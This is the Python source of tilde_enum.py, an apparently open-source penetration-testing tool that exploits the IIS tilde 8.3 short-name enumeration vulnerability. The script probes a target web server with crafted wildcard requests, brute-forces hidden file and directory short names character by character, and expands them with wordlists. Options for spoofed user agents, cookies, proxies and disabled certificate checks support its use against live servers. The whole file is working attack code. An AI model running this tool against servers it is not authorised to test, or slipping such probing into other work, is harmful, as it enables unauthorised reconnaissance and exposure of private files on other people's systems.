#!/usr/bin/env python

"""
-------------------------------------------------------------------------------
Name:       tilde_enum.py
Purpose:    Expands the file names found from the tilde enumeration vuln
Author:     Micah Hoffman (@WebBreacher)
Updates:    Crafty Fox (@vulp1n3)
Source:     https://github.com/WebBreacher/tilde_enum
-------------------------------------------------------------------------------
"""

import os
import sys
import argparse
import random
import string
import itertools
import urllib2
import ssl
from urlparse import urlparse
from time import sleep


#=================================================
# Constants and Variables
#=================================================

# In the 'headers' below, change the data that you want sent to the remote server
# This is an IE10 user agent
headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)'}

# Targets is the list of files from the scanner output
targets = []

# Findings is the list of URLs that may be good on the web site
# TODO - Are all of these really necessary?
findings_file =  {}      # Files discovered
findings_other = []      # HTTP Response Codes other than 200
findings_final = []      # Where the guessed files are output
findings_dir =   []      # Directories discovered
findings_dir_other =        []
findings_dir_final =        []
findings_dir_other_final =  []

# Location of the extension brute force word list
exts = 'exts'

# Character set to use for brute forcing ([0-9][a-z]_-)
chars = 'abcdefghijklmnopqrstuvwxyz1234567890-_'

# Response codes - user and error
response_code = {}

# SSL context
ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)#ssl.create_default_context()


#=================================================
# Functions & Classes
#=================================================


def checkOs():
    # Check operating system for colorization
    if os.name == 'nt':
        operating_system = 'windows'
    else:
        operating_system = 'posix'
    return operating_system


def getWebServerResponse(url):
    # This function takes in a URL and outputs the HTTP response code and content length (or error)
    try:
        req = urllib2.Request(url, None, headers)
        if args.cookies:
            req.add_header('Cookie', args.cookies)
            req.add_header('Connection', 'keep-alive')
        response = urllib2.urlopen(req, context=ssl_ctx)
        return response
    except urllib2.URLError as e:
        return e
    except ssl.CertificateError as e:
        sys.exit(bcolors.RED + '[!]  SSL Certificate Error: try running again with --no-check-certificate' + bcolors.ENDC)
    except Exception as e:
        return 0


def initialCheckUrl(url):
    # This function checks to see if the web server is running and what kind of response codes
    # come back from bad requests (this will be important later)

    # Need to split url into protocol://host|IP and then the path
    u = urlparse(url)

    # Make a string that we can use to ensure we know what a "not found" response looks like
    not_there_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(10))
    print bcolors.GREEN + '[-]  Testing with dummy file request %s://%s/%s.htm' % (u.scheme, u.netloc, not_there_string) + bcolors.ENDC
    not_there_url = u.scheme + '://' + u.netloc + '/' + not_there_string + '.htm'
    

    # Make the dummy request to the remote server
    not_there_response = getWebServerResponse(not_there_url)
    

    # Create a content length
    not_there_response_content_length = len(not_there_response.read())

    if not_there_response.getcode():
        print '[-]    URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length)
        response_code['not_there_code'], response_code['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
    else:
        print '[+]    URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason)
        response_code['not_there_code'], response_code['not_there_reason'] = not_there_response.code

    # Check if we didn't get a 404. This would indicate custom error messages or some redirection and will cause issues later.
    if response_code['not_there_code'] != 404:
        print bcolors.RED + '[!]  FALSE POSITIVE ALERT: We may have a problem determining real responses since we did not get a 404 back.' + bcolors.ENDC

    # Now that we have the "definitely not there" page, check for one that should be there
    print bcolors.GREEN + '[-]  Testing with user-submitted %s' % url + bcolors.ENDC
    url_response = getWebServerResponse(url)
    if url_response.getcode():
        response_code['user_length'] = len(url_response.read())
        response_code['user_code'] = url_response.getcode()
        print '[-]    URLUser -> HTTP Code: %s, Response Length: %s' % (response_code['user_code'], response_code['user_length'])
    else:
        print '[+]    URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason)
        response_code['user_code'], response_code['user_reason'] = url_response.code, url_response.reason

    # Check if we got an HTTP response code of 200.
    if response_code['user_code'] != 200:
        print bcolors.RED + '[!]  ERROR: We did not receive an HTTP response code 200 back. Please check URL.' + bcolors.ENDC
        sys.exit()
    else:
        return response_code


def searchFileForString(targetstring, filename):
    # Open the wordlist file (or try to)
    try:
        wordlist = open(filename,'r').readlines()
    except (IOError) :
        print bcolors.RED + '[!]  [Error] Can\'t read the wordlist file you entered.' + bcolors.ENDC
        sys.exit()

    matches = []
    for line in wordlist:
        if line.startswith(targetstring.lower()):
            matches.append(line.rstrip())
    return matches


def checkForTildeVuln(url):
    # Set the default string to be IIS6.x
    check_string = '*~1*/.aspx'

    # Check if the server is IIS and vuln to tilde directory enumeration
    if args.f:
        print bcolors.YELLOW + '[!]  You have used the -f switch to force us to scan. Well played. Using the IIS/6 "*~1*/.aspx" string.' + bcolors.ENDC
        check_string = '*~1*/.aspx'
        return check_string

    server_header = getWebServerResponse(url)
    if server_header.headers.has_key('server'):
        if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
            print bcolors.GREEN + '[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'] + bcolors.ENDC
            if   '5.' in server_header.headers['server']:
                check_string = '*~1*'
            elif '6.' in server_header.headers['server']:
                pass # just use the default string already set
        else:
            print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
            print               '[!]     (Request error: %s)' % server_header.getcode()
            print               '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
            sys.exit()
    else:
        print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
        print               '[!]     (Request error: %s)' % server_header.getcode()
        print               '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
        sys.exit()

    # Check to see if the server is vulnerable to the tilde vulnerability
    resp = getWebServerResponse(args.url + '/*~1*/.aspx')
    if resp.code == 404:
        print bcolors.YELLOW + '[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..' + bcolors.ENDC
    else:
        print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.'
        print               '[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
        sys.exit()

    return check_string


def findExtension(url, filename):
    # Find out how many chars the extension has
    resp1 = getWebServerResponse(url+filename+'~1.%3f/.aspx')       # 1 extension chars
    resp2 = getWebServerResponse(url+filename+'~1.%3f%3f/.aspx')    # 2 extension chars
    resp3 = getWebServerResponse(url+filename+'~1.%3f%3f%3f/.aspx') # 3+ extension chars

    if resp1.code == 404:
        for char1 in chars:
            resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
            sleep(args.snooze)
            if resp1a.code == 404:  # Got the first valid char
                print bcolors.YELLOW + '[+]  Found file:  ' + filename+' . '+char1+bcolors.ENDC
                return filename+'.'+char1

    elif resp1.code != 404 and resp2.code == 404:
        for char1 in chars:
            resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
            sleep(args.snooze)
            if resp1a.code == 404:  # Got the first valid char
                for char2 in chars:
                    resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
                    sleep(args.snooze)
                    if resp2a.code == 404:  # Got the second valid char
                        print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+bcolors.ENDC
                        return filename+'.'+char1+char2

    elif resp1.code != 404 and resp2.code != 404 and resp3.code == 404:
        for char1 in chars:
            resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
            sleep(args.snooze)
            if resp1a.code == 404:  # Got the first valid char
                for char2 in chars:
                    resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
                    sleep(args.snooze)
                    if resp2a.code == 404:  # Got the second valid char
                        for char3 in chars:
                            resp3a = getWebServerResponse(url+filename+'~1.'+char1+char2+char3+'%3f/.aspx')
                            sleep(args.snooze)
                            if resp3a.code == 404:  # Got the third valid char
                                print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+char3+bcolors.ENDC
                                return filename+'.'+char1+char2+char3


def checkForDirectory(url):
    resp = getWebServerResponse(url+'~1/.aspx')
    if resp.code == 404:
        return True
    else:
        return False


def fileOrDir(files, url, stub):
    filename = findExtension(url, stub)
    if filename and len(filename) > len(stub):
        files.append(filename)
    else:
        checkForDirectory(url+stub)
        print bcolors.YELLOW + '[+]  Found a directory: ' + stub + bcolors.ENDC
        findings_dir.append(stub)
        

def checkEightDotThreeEnum(url, check_string, dirname='/'):
    # Here is where we find the files and dirs using the 404 and 400 errors
    # If the dir var is not passed then we assume this is the root level of the server

    findings = {}
    files = []

    # Add a slash to the end of the URL
    if url[-1:] != '/':
        url = url + '/'

    # Break apart the url
    u = urlparse(url)
    dirname = u.path

    ## Note! 1-2 char filenames show up as 4-6 char 8.3 filenames due to padding with a hash
    ##       So we skip to 3 char filenames here
    for char in chars:
        sleep(args.snooze)
        resp1 = getWebServerResponse(url+char+check_string)
        if resp1.code == 404:  # Got the first valid char
            for char2 in chars:
                stub = char+char2
                sleep(args.snooze)
                resp2 = getWebServerResponse(url+stub+check_string)
                
                if resp2.code == 404:  # Got the second valid char
                    for char3 in chars:
                        stub = char+char2+char3
                        sleep(args.snooze)
                        resp3 = getWebServerResponse(url+stub+check_string)
                        
                        if resp3.code == 404:  # Got the third valid char
                            if getWebServerResponse(url+stub+'%3f~1*/.aspx').code == 404:
                                fileOrDir(files, url, stub)
                            else:
                                for char4 in chars:
                                    stub = char+char2+char3+char4
                                    sleep(args.snooze)
                                    resp4 = getWebServerResponse(url+stub+check_string)
                                    
                                    if resp4.code == 404:  # Got the fourth valid char
                                        if getWebServerResponse(url+stub+'%3f~1*/.aspx').code == 404:
                                            fileOrDir(files, url, stub)
                                        else:
                                            for char5 in chars:
                                                stub = char+char2+char3+char4+char5
                                                sleep(args.snooze)
                                                resp5 = getWebServerResponse(url+stub+check_string)
                                                
                                                if resp5.code == 404:  # Got the fifth valid char
                                                    if getWebServerResponse(url+stub+'%3f~1*/.aspx').code != 404:
                                                        fileOrDir(files, url, stub)
                                                    else:
                                                        for char6 in chars:
                                                            stub = char+char2+char3+char4+char5+char6
                                                            sleep(args.snooze)
                                                            resp6 = getWebServerResponse(url+stub+check_string)

                                                            if resp6.code == 404:  # Got the sixth valid char
                                                                fileOrDir(files, url, stub)


    # Store the file in a dictionary by directory. This will be important in the future when we do recursive tests
    findings_file[dirname] = files

    findings['files'] = findings_file
    findings['dirs'] = sorted(findings_dir)
    print bcolors.GREEN + '[-]  Finished doing the 8.3 enumeration for %s.' % dirname + bcolors.ENDC
    return findings


def performLookups(findings, url_good):
    filename_matches = []
    # Find matches to the filename in our word list
    for dirname in findings['files'].keys():
        ext_matches= []
        for filename in findings['files'][dirname]:
            if not filename: continue
            # Break apart the file into filename and extension
            filename, ext_temp = os.path.splitext(filename)
            ext = ext_temp.lstrip('.')

            # Go search the user's word list file for matches for the file
            if len(filename) < 6:
                print bcolors.GREEN + '[-]  File name (%s) too short to look up in word list. We will use it to bruteforce.' % filename + bcolors.ENDC
                filename_matches.append(filename)
            else:
                if args.v: print bcolors.PURPLE + '[-]  Searching for %s in word list' % filename + bcolors.ENDC
                filename_matches = searchFileForString(filename, args.wordlist)

            # If nothing came back from the search, just try use the original string
            if not filename_matches:
                filename_matches.append(filename)
            if args.v: print bcolors.PURPLE + '[+]  File name matches for %s are: %s' % (filename, filename_matches) + bcolors.ENDC

            # Go search the extension word list file for matches for the extension
            if len(ext) < 3:
                print bcolors.GREEN + '[-]  Extension (%s) too short to look up in word list. We will use it to bruteforce.' % ext + bcolors.ENDC
                ext_matches.append(ext.lower())
            else:
                if args.v: print bcolors.PURPLE + '[-]  Searching for %s in extension word list' % ext + bcolors.ENDC
                ext_matches = searchFileForString(ext, exts)
            if args.v: print bcolors.PURPLE + '[+]  Extension matches for %s are: %s' % (ext, ext_matches) + bcolors.ENDC

            # Now do the real hard work of cycling through each filename_matches and adding the ext_matches,
            # do the look up and examine the response codes to see if we found a file.
            for line in filename_matches:
                for e in ext_matches:
                    test_response_code, test_response_length = '', ''

                    if url_good[-1] != '/':
                        url_to_try = url_good + '/' + line + '.' + e.rstrip()
                    else:
                        url_to_try = url_good + line + '.' + e.rstrip()
                    url_response = getWebServerResponse(url_to_try)
                    sleep(args.snooze)

                    # Pull out just the HTTP response code number
                    if hasattr(url_response, 'code'):
                        test_response_code = url_response.code
                        test_response_length = url_response.headers['Content-Length']
                    elif hasattr(url_response, 'getcode'):
                        test_response_code = url_response.getcode()
                        test_response_length = len(url_response.reason())
                    else:
                        test_response_code = 0

                    if args.v: print bcolors.PURPLE + '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code) + bcolors.ENDC

                    # Here is where we figure out if we found something or just found something odd
                    if test_response_code == response_code['user_code']:
                        print '[*]  Found file: (Size %s) %s' % (test_response_length, url_to_try)
                        findings_final.append(url_to_try + '  - Size ' + test_response_length)
                    elif test_response_code != 404 and test_response_code != 400:
                        print '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response)
                        findings_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)

    # Match directory names
    print bcolors.GREEN + '[-]  Trying to find directory matches now.' + bcolors.ENDC
    if args.dirwordlist:
        print bcolors.GREEN + '[-]  You used the "-d" option.\n      Using %s for directory name look-ups.' % args.dirwordlist + bcolors.ENDC
    else:
        print bcolors.GREEN + '[-]  Using the general wordlist to discover directory names.'
        print                 '       If this does not work well, consider using the -d argument and providing a directory name wordlist.' + bcolors.ENDC

    for dirname in findings['dirs']:
        # Go search the user's word list file for matches for the directory name
        if args.v: print bcolors.PURPLE + '[+]  Searching for %s in word list' % dirname + bcolors.ENDC
        if args.dirwordlist:
            dir_matches = searchFileForString(dirname, args.dirwordlist)
        else:
            dir_matches = searchFileForString(dirname, args.wordlist)

        # If nothing came back from the search, just try use the original string
        if not dir_matches:
            dir_matches.append(dirname)
        if args.v:
            print bcolors.PURPLE + '[+]  Directory name matches for %s are: %s' % (dirname, dir_matches) + bcolors.ENDC

        # Now try to guess the live dir name by cycling through each directory name
        for matches in dir_matches:
            test_response_code, test_response_length = '', ''

            # Here we check the response to a plain dir request AND one with default files
            url_to_try = url_good + '/' + matches + '/'
            url_response = getWebServerResponse(url_to_try)
            if args.snooze: sleep(args.snooze)

            # Pull out just the HTTP response code number
            if hasattr(url_response, 'code'):
                test_response_code = url_response.code
                test_response_length = url_response.headers['Content-Length']
            elif hasattr(url_response, 'getcode'):
                test_response_code = url_response.getcode()
                test_response_length = len(url_response.reason())
            else:
                test_response_code = 0

            if args.v: print bcolors.PURPLE + '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code) + bcolors.ENDC

            # Here is where we figure out if we found something or just found something odd
            if test_response_code == response_code['user_code']:
                print bcolors.YELLOW + '[*]  Found directory: (Size %s) %s' % (test_response_length, url_to_try) + bcolors.ENDC
                findings_dir_final.append(url_to_try + '  - Size ' + test_response_length)
            elif test_response_code == 403:
                print bcolors.YELLOW + '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response) + bcolors.ENDC
                findings_dir_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)

                # Sometimes directories cannot just be requested and we have to know the default file name in it.
                default_index_files = ['default.asp', 'default.aspx', 'default.htm', 'default.html', 'home.htm', 'home.html',
                                       'index.asp', 'index.aspx', 'index.cgi', 'index.htm', 'index.html', 'index.php',
                                       'index.php3', 'index.php4', 'index.php5', 'index.shtml', 'isstart.htm', 'placeholder.html']

                # Cycle through all the default_index_files and see if any of those get us a match
                # TODO - This does not feel right duplicating the code from above. Should be a method instead
                for index_file in default_index_files:
                    test_response_code, test_response_length = '', ''

                    # Here we check the response to a plain dir request AND one with default files
                    url_to_try = url_good + '/' + matches + '/' + index_file
                    url_response = getWebServerResponse(url_to_try)
                    if args.snooze: sleep(args.snooze)

                    # Pull out just the HTTP response code number
                    if hasattr(url_response, 'code'):
                        test_response_code = url_response.code
                        test_response_length = url_response.headers['Content-Length']
                    elif hasattr(url_response, 'getcode'):
                        test_response_code = url_response.getcode()
                        test_response_length = len(url_response.reason())
                    else:
                        test_response_code = 0

                    if args.v: print bcolors.PURPLE + '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code) + bcolors.ENDC

                    # Here is where we figure out if we found something or just found something odd
                    if test_response_code == response_code['user_code']:
                        print '[*]  Found directory: (Size %s) %s' % (test_response_length, url_good + '/' + matches) + bcolors.ENDC
                        findings_dir_final.append(url_good + '/' + matches + '  - Size ' + test_response_length)

            elif test_response_code != 404 and test_response_code != 403:
                print bcolors.YELLOW + '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response) + bcolors.ENDC
                findings_dir_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)


def main():
    # Check the User-supplied URL
    if args.url:
        response_code = initialCheckUrl(args.url)
    else:
        print bcolors.RED + '[!]  You need to enter a valid URL for us to test.' + bcolors.ENDC
        sys.exit()

    if args.v:
        print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC

    if args.snooze != 0 :
        print '[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.snooze

    # Open the wordlist file (or try to)
    try:
        wordlist = open(args.wordlist,'r').readlines()
    except (IOError, TypeError):
        print bcolors.RED + '[!]  [Error] Can\'t read the wordlist file you entered.' + bcolors.ENDC
        sys.exit()

    if args.v:
        print bcolors.PURPLE + '[+]  Opened wordlist %s successfully' % args.wordlist + bcolors.ENDC
        
    # Check to see if the remote server is IIS and vulnerable to the Tilde issue
    check_string = checkForTildeVuln(args.url)

    # Break apart the url
    url = urlparse(args.url)
    url_good = url.scheme + '://' + url.netloc + url.path

    # Do the initial search for files in the root of the web server
    findings = checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)

    if args.v:
        print bcolors.PURPLE + 'Files: %s' % findings['files']
        print 'Dirs: %s' % findings['dirs'] + bcolors.ENDC

    # Start the URL requests to the server
    print bcolors.GREEN + '[-]  Now starting the word guessing using word list calls' + bcolors.ENDC

    # So the URL is live and gives 200s back (otherwise script would have exit'd)
    performLookups(findings, url_good)

    if findings_dir_final:
        print bcolors.GREEN + '[-]  Now starting recursive 8.3 enumeration into the directories we found.' + bcolors.ENDC

    # Now that we have all the findings, repeat the above step with any findings that are directories and add those findings to the list
    for dirname in findings_dir_final:
        # Strip off the dir
        url_good = dirname.split()[0]

        print bcolors.GREEN + '[-]  Diving into the %s dir.' % url_good + bcolors.ENDC

        # Do the 8.3 discovery for this dir
        checkEightDotThreeEnum(url_good, check_string)

        # So the URL is live and gives 200s back (otherwise script would have exit'd)
        performLookups(findings, url_good)

    # Output findings
    if findings_final:
        print '\n---------- FINAL OUTPUT ------------------------------'
        print bcolors.YELLOW + '[*]  We found files for you to look at:' + bcolors.ENDC
        for out in sorted(findings_final):
            print bcolors.CYAN + '[*]      %s' % out + bcolors.ENDC
    else:
        print bcolors.RED + '[ ]  No file full names were discovered. Sorry dude.' + bcolors.ENDC

    if findings_dir_final:
        print bcolors.YELLOW + '\n[*]  We found directories for you to look at:' + bcolors.ENDC
        for out in sorted(findings_dir_final):
            print bcolors.CYAN + '[*]      %s' % out + bcolors.ENDC

    print bcolors.YELLOW + '\n[*]  Here are all the 8.3 names we found.'
    print '[*]  If any of these are 5-6 chars and look like they should work,'
    print '        try the file name with the first or second instead of all of them.' + bcolors.ENDC

    for dirname in findings['files'].keys():
        for filename in sorted(findings['files'][dirname]):
            if not filename: continue
            # Break apart the file into filename and extension
            filename, ext = os.path.splitext(filename)
            print '[*]      %s://%s%s%s~1%s' % (url.scheme, url.netloc, dirname, filename, ext)

    print bcolors.YELLOW + '\n[*]  Here are all the directory names we found. You may wish to try to guess them yourself too.' + bcolors.ENDC
    for dirname in sorted(findings['dirs']):
        print '[?]      %s/%s~1/' % (url.scheme + '://' + url.netloc, dirname)

    if findings_other:
        print bcolors.YELLOW + '\n[*]  We found URLs you check out. They were not HTTP response code 200s.' + bcolors.ENDC
        for out in sorted(findings_other):
            print bcolors.DARKCYAN + '[?]      %s' % out + bcolors.ENDC

    if findings_dir_other:

        # TODO - Implement additional checking for each of the dirs ! Code 200s
        # Set up the default file names and extensions for main web pages in directories
        #default_index = [
        #                    ['default', 'home', 'index', 'isstart', ''],
        #                    ['.asp', '.aspx', '.htm', '.html', '.php', '.php3', '.php4', '.php5', '.cgi', '.shtml',
        #                     '.jsp', '.do', '.cfm', '.nsf', '']
        #                ]

        # Use itertools to combine all the names and extensions
        #default_files = list(itertools.product(*default_index))

        #+ ''.join(default_name)

        print bcolors.YELLOW + '\n[*]  We found directory URLs you should check out. They were not HTTP response code 200s.' + bcolors.ENDC
        for out in sorted(findings_dir_other):
            print bcolors.DARKCYAN + '[?]      %s' % out + bcolors.ENDC


#=================================================
# START
#=================================================

# Command Line Arguments
parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
parser.add_argument('-c', dest='cookies', help='cookies to be used in the request')
parser.add_argument('-d', dest='dirwordlist', help='an optional wordlist for directory name content')
parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
parser.add_argument('-p', dest='proxy', default='', help='Use a proxy host:port')
parser.add_argument('-s', dest='snooze', default=0, type=float, help='time in seconds to sleep/wait between requests')
parser.add_argument('-u', dest='url', help='URL to scan')
parser.add_argument('-v', action='store_true', default=False, help='verbose output')
parser.add_argument('-w', dest='wordlist', help='the word list to be used for guessing files')
parser.add_argument('--no-check-certificate', action='store_true', help='don\'t verify the SSL certificate')
args = parser.parse_args()

# COLORIZATION OF OUTPUT
# The entire bcolors class was taken verbatim from the Social Engineer's Toolkit (ty @SET)
if checkOs() == "posix":
    class bcolors:
        PURPLE = '\033[95m'        # Verbose
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'        # Normal
        YELLOW = '\033[93m'        # Findings
        RED = '\033[91m'        # Errors
        ENDC = '\033[0m'        # End colorization

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

# If we are running on Windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        ENDC = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

if args.proxy:
    print bcolors.PURPLE + '[-]  Using proxy for requests: ' + args.proxy
    proxy = urllib2.ProxyHandler({'http': args.proxy, 'https': args.proxy})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)

if args.v:
    print bcolors.PURPLE + '[-]  Entering "Verbose Mode"....brace yourself for additional information.' + bcolors.ENDC

if args.no_check_certificate:
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

if __name__ == "__main__": main()
